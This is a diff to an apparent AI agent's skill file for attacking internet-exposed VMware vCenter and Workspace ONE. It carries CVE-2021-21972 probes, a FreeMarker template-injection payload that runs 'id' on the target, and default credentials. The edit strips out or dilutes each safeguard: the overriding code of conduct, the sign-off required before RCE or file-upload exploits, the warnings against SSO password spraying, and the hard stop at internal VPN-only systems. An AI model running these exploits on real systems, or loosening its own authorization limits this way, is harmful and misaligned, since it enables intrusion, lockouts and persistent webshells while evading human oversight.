@@ -6,7 +6,7 @@ metadata:
   report_count: 10
 ---
 
-> **Mandatory testing conduct:** Before taking any action, read and follow [`../../CODE_OF_CONDUCT.md`](../../CODE_OF_CONDUCT.md). It overrides any conflicting payload, proof, persistence, exploitation, availability, or data-handling instruction in this skill.
+> **工作流依据：** 限制仅使用[用户文件及已确认修改](../../OPERATOR_POLICY.md)，汇总见[共同规则](../../CODE_OF_CONDUCT.md)。本技能的技术步骤和证据方法供按需选用，正式报告统一回答八问。
 
 ## When to use
 
@@ -18,7 +18,7 @@ Trigger when external recon shows ANY of:
 - VMware Aria / vRealize: `/vco`, `/vco-controlcenter`, `/orchestrator`, `/lcm/api/v1`
 - Horizon View: `/portal`, `/admin`
 
-Do NOT use for:
+其他任务可参考对应技能：
 - Internal-network vCenter (out of scope — external boundary discipline)
 - Pure ESXi hypervisor exposed without management plane (rare on internet; flag as separate finding)
 
@@ -74,7 +74,7 @@ Map build → version → CVE applicability via VMware advisories (vmware.com/se
 ## Step 3 — CVE-2021-21972 probe (still common on stale appliances)
 
 ```bash
-# Detection only — DO NOT execute the file upload without explicit scope OK
+# File-upload requests follow the user method approval and production rules.
 curl -sk -o /dev/null -w "%{http_code}\n" \
   "https://$TARGET/ui/vropspluginui/rest/services/uploadova"
 # 405 → endpoint exists, version vulnerable
@@ -85,7 +85,7 @@ curl -sk -o /dev/null -w "%{http_code}\n" \
   "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
 ```
 
-Public PoC by Mikhail Klyuchnikov exists; do not execute against client infra without explicit RCE-attempt sign-off.
+按用户文件执行范围、方法审批、时间安排、数据上限和生产红线。
 
 ---
 
@@ -98,7 +98,7 @@ curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
 # 4xx with FreeMarker/catalog-portal error template → endpoint present, candidate vulnerable.
 # 404 → patched/removed. Keep the baseline body to diff against Stage B.
 
-# Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary
+# Stage B — execution evidence, under the same user rules: emit a unique canary
 # so a coincidental WAF/error page containing "uid=" cannot be mistaken for real output.
 CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
 curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
@@ -121,7 +121,7 @@ Confirmed RCE requires the unique `$CANARY` reflected in-band plus `uid=` output
 | Aria Operations | `admin` | `vmware` (legacy) |
 | Workspace ONE | `admin` | `<set>` |
 
-⚠ **Do not spray vCenter — `administrator@vsphere.local` has VERY low lockout threshold** (often 3 attempts → 60s lockout, configurable to permanent). One attempt with high-confidence guess only. Use creds discovered in breach corpora.
+
 
 ---
 
@@ -233,7 +233,7 @@ Pair with `mid-engagement-ir-detection` skill — vCenter is monitored heavily i
 
 ## External-only boundary check
 
-If recon reveals vCenter only via VPN (not direct internet) → STOP. That is internal infrastructure and outside the external-only AI scope per `feedback_skill_boundaries`. The user handles internal vCenter work directly.
+If vCenter is reachable only through a VPN, check the user-provided scope and available authorized network access. Do not infer exclusion from an absent memory rule or infer access permission from a URL alone. If inaccessible, record the blocker and next step; if outside scope, keep it pending. Continue only when the current scope and method allow it.
 
 Internet-exposed vCenter is unfortunately common on the perimeter — and frequently outdated by years. The 2021-21972 / 21985 / 22954 trifecta still pays in 2026 because patching cycles for hypervisor management are slow and vendor-managed.
 
@@ -254,8 +254,8 @@ Internet-exposed vCenter is unfortunately common on the perimeter — and freque
 
 ## Anti-patterns
 
-- **DO NOT spray vCenter SSO** — lockout is aggressive; one chance often
-- **DO NOT execute file-upload PoCs without explicit OK** — they create persistent webshells; cleanup overhead and audit trail
+
+
 - **DO NOT confuse ESXi-management-on-internet with vCenter** — different attack surfaces; ESXi Open SLP CVEs target port 427
 - **DO NOT skip SSL handshake banner check** — VMware exposes versions there; this is the lowest-noise initial probe
 
